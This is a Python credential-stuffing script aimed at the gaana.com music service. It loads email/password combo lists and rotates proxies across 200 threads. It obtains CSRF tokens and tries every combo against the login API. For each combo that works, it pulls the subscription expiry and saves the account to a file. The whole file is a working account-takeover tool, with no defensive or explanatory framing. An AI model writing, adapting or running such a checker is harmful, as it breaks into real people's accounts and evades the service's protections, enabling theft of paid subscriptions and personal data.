import json
from threading import Thread, Lock

from httplib2 import ProxyInfo, Http

from emailpassword import email_password
from proxydictionary2 import htttp_proxy, socks4_proxy, socks5_proxy

start_count = 0
ip_count = 0
proxy_list = []
combos = []
verified = []
lock = Lock()


def select_proxy():
    global ip_count
    with lock:
        if ip_count == len(proxy_list):
            print(ip_count)
            ip_count = 0
        ip = ip_count
        ip_count += 1
    return ip


def inc_count(proxy_num):
    proxy_list[proxy_num]["count"] += 1


class CreateTask(Thread):
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        while True:
            proxy_num = select_proxy()
            proxy = proxy_list[proxy_num]
            try:
                temp = 0
                global start_count
                if start_count >= len(combos):
                    break
                http = Http(
                    proxy_info=ProxyInfo(proxy_host=str(proxy["proxy"]), proxy_port=int(proxy["port"]),
                                         proxy_type=proxy["type"],proxy_user=proxy["user"],proxy_pass=proxy["pass"]))
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://gaana.com",
                    "Referer": "https://gaana.com/login",
                    "User-Agent": "Mozilla/5.0 (Linux; U; Android 5.1.1; LGM-V300K Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Mobile Safari/537.36"
                }
                csrf_res, csrf_con = http.request("https://gaana.com/api/csrf-token", method="POST", body="set=csrf",
                                                  headers=headers)
                csrf = ""
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://gaana.com",
                    "Referer": "https://gaana.com/login",
                    "User-Agent": "Mozilla/5.0 (Linux; U; Android 5.1.1; LGM-V300K Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Mobile Safari/537.36",
                    "Cookie": csrf_res["set-cookie"] + "; __g_l=1"
                }
                for i in range(0, 5):
                    if start_count >= len(combos):
                        temp = 1
                        break
                    
                    with lock:
                        k = start_count
                        start_count += 1
                        print(start_count)
                    combo = combos[k]
                    csrf = csrf or csrf_con.decode(encoding="UTF-8").strip("\"")
                    #print(csrf)
                    body = "client_id=&csrf=" + csrf + "&email=" + combo["email"] + "&password=" + combo[
                        "password"] + "&redirect_uri=&response_type=&scope=&source=&state=&urlChecker:false"
                    res, cont = http.request("https://gaana.com/api/login", method="POST", body=body, headers=headers)
                    cont = json.loads(cont.decode(encoding="UTF-8"))
                    if "status" in cont.keys() and "csrf" in cont.keys():
                        if cont["status"] == "success":
                            if cont["token"]:
                                headers["Cookie"] = res["set-cookie"].split(",")[0].split(";")[0] + ";" + \
                                                    res["set-cookie"].split(",")[2].split(";")[0]
                                headers["Referer"] = "https://gaana.com/profile"
                                body = "profile=profile"
                                res, cont = http.request("https://gaana.com/api/user-profile", method="POST", body=body,
                                                         headers=headers)
                                cont = json.loads(cont.decode(encoding="UTF-8"))
                                print(combo, "Expires On: ", cont["subscriptionStatus"]["validupto"])
                                combo["expireOn"] = cont["subscriptionStatus"]["validupto"]
                                verified.append(combo)
                                #with lock:
                                with open(str(k)+".json","w") as a:
                                    #f.write("\n")
                                    json.dump(combo,a)
                            else:
                                print(combo, "     Free")
                                combo["expireOn"] = "Free"
                                verified.append(combo)
                                #with lock:
                                with open("Free-"+str(k)+".json","w") as a:
                                    #f.write("\n")
                                    json.dump(combo,a)
                                break
                        else:
                            csrf = cont["csrf"]
                    else:
                        #with lock:
                        with open("error"+str(k)+".txt","w") as a:
                            a.write(str(a)+str(proxy["user"])+"     "+str(proxy["combo"])+"    Cont="+str(cont))
                        #print(cont)
                        break
                del http
            except Exception as a:
                #print(a)
                inc_count(proxy_num)
                continue
            if temp == 1:
                break


#proxy_list = proxy_list + socks5_proxy() + socks4_proxy() +
proxy_list=htttp_proxy()
combos = email_password()
# print(proxy_list[0])
# print(combos[0])

for i in range(0,200):
    thread = CreateTask()
    thread.start()
